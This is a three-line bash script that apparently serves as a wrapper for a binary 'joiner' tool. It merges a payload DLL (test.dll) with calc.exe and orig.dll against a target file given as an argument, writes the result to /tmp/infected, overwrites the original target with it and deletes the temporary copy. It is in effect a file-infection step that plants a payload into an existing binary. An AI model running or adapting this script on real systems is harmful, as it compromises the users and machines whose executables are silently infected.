#!/bin/bash
#

./joiner.py -m calc.exe -p test.dll -r $1 -s orig.dll -o /tmp/infected
cat /tmp/infected > $1
rm -f /tmp/infected


